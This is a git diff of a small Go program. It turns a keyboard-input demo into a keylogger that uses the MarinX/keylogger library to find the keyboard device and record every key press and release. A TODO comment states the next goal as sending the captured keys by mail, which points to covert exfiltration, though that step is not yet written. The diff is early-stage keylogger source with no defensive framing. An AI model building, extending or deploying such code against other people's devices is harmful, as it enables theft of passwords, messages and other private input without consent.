@@ -1,44 +1,54 @@
 package main
 
 import (
-	"fmt"
-	"github.com/eiannone/keyboard"
+	"github.com/MarinX/keylogger"
+	log "github.com/sirupsen/logrus"
 )
 
 // TODO:
 //		1. Read Keyboard
-//		2. Write to file
-//		3. Send to mail
+//		2. Send to mail
 
 func main() {
-	fmt.Println("Hello world")
+	log.Println("Welcome")
+
 	readKeyboard()
 }
 
 func readKeyboard() {
-	keysPressed, err := keyboard.GetKeys(10)
-	check(err)
-
-	defer func() {
-		_ = keyboard.Close()
-	}()
-
-	fmt.Println("Press ESC to quit")
-	for {
-		event := <-keysPressed
-		if event.Err != nil {
-			panic(event.Err)
-		}
-		fmt.Printf("You pressed: rune %q, key %X\n", event.Rune, event.Key)
-		if event.Key == keyboard.KeyEsc {
-			break
-		}
+	keyboard := keylogger.FindKeyboardDevice()
+	if len(keyboard) <= 0 {
+		log.Error("No Keyboard Found")
+		return
 	}
 
+	log.Println("Found a Keyboard at", keyboard)
+
+	k, err := keylogger.New(keyboard)
+	check(err)
+	defer k.Close()
+
+	events := k.Read()
+
+	// range of events
+	for e := range events {
+		switch e.Type {
+		case keylogger.EvKey:
+			// if the state of key is pressed
+			if e.KeyPress() {
+				log.Println("[event] press key ", e.KeyString())
+			}
+
+			// if the state of key is released
+			if e.KeyRelease() {
+				log.Println("[event] release key ", e.KeyString())
+			}
+		}
+	}
 }
 
 func check(e error) {
 	if e != nil {
-		panic(e)
+		log.Error(e)
 	}
 }
